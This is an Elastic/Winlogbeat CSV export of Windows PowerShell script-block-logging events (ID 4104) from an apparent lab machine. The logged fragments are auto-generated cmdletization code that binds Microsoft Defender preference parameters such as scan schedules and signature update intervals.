Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","ameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {
          [object]$__cmdletization_value = ${RemediationScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {
          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {
          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {
          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {
          [object]$__cmdletization_value = ${ServiceHealthReportInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {
          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {
          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {
          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {
          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {
          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanParameters')) {
          [object]$__cmdletization_value = ${ScanParameters}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {
          [object]$__cmdletization_value = ${ScanScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {
          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {
          [object]$__cmdletization_value = ${ScanScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType ",13,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3342,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",bHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.207",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (14 of 20):
= 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {
          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {
          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {
          [object]$__cmdletization_value = ${SignatureFallbackOrder}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {
          [object]$__cmdletization_value = ${SharedSignaturesPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {
          [object]$__cmdletization_value = ${SignatureScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {
          [object]$__cmdletization_value = ${SignatureScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {
          [object]$__cmdletization_value = ${MeteredConnectionUpdates}
          $__cmdletization_me

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","= 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {
          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {
          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}
